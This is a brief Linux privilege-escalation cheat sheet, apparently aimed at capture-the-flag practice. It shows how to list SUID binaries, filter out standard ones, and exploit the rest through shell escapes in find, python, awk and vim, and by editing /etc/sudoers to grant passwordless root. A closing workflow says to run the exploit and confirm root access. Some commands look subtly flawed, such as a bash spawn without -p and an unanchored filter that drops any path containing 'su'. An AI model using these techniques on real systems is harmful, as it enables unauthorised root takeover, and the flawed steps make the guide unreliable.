When a regular file has the SUID permission enabled, any user who runs that executable temporarily gains the privileges of the file's owner while the program is running. So if a file owner is root, then the person who runs a file will be granted temp root access.

## Finding SUID Binaries

**Basic command:**
```bash
find / -type f -perm -4000 2>/dev/null
```

## Standard Binaries to Ignore (False Positives)

Standard system binaries that REQUIRE SUID bits to function normally:
- `passwd` — change password (system function)
- `sudo` — run commands as root (control mechanism)
- `su` — switch user (control mechanism)
- `mount` — mount filesystems (system admin)
- `umount` — unmount filesystems (system admin)
- `chsh` — change shell
- `chfn` — change finger info
- `newgrp` — change group
- `fusermount` — FUSE mount helper
- `pkexec` — PolicyKit authentication

**Filtered command (removes noise):**
```bash
find / -type f -perm -4000 2>/dev/null | grep -vE 'passwd|sudo|su|mount|umount|chsh|chfn|newgrp|fusermount|pkexec'
```

**Automated filtering script:**
```bash
find / -type f -perm -4000 2>/dev/null | while read bin; do
  name=$(basename "$bin")
  if ! echo "$name" | grep -qE '^(passwd|sudo|su|mount|umount|chsh|chfn|newgrp|fusermount|pkexec)$'; then
    echo "$bin"
  fi
done
```

## Checking Against GTFOBins

Compare all results to GTFOBins: https://gtfobins.org/

Any SUID binary NOT in the standard list above is worth checking.

## Exploitation Examples

When you find an abnormal SUID binary (exploitable via GTFOBins), use the documented technique:

### Example 1: find
```bash
/usr/bin/find . -exec cat /root/flag.txt \; -quit
```

### Example 2: python
```bash
python -c 'import os; os.system("/bin/bash")'
```

### Example 3: awk
```bash
awk 'BEGIN {system("/bin/bash")}'
```

### Example 4: nano
```bash
nano /etc/sudoers
# Then add your user with NOPASSWD privileges
```

### Example 5: vim
```bash
vim /etc/sudoers
:!bash
```

## Complete Workflow

1. **Find all SUID binaries:**
   ```bash
   find / -type f -perm -4000 2>/dev/null
   ```

2. **Filter out standard binaries:**
   ```bash
   find / -type f -perm -4000 2>/dev/null | grep -vE 'passwd|sudo|su|mount|umount|chsh|chfn|newgrp|fusermount|pkexec'
   ```

3. **Check each result on GTFOBins** (https://gtfobins.org/) for exploitation technique

4. **Execute the exploitation command** provided by GTFOBins

5. **Verify privilege escalation:**
   ```bash
   id
   whoami
   ```
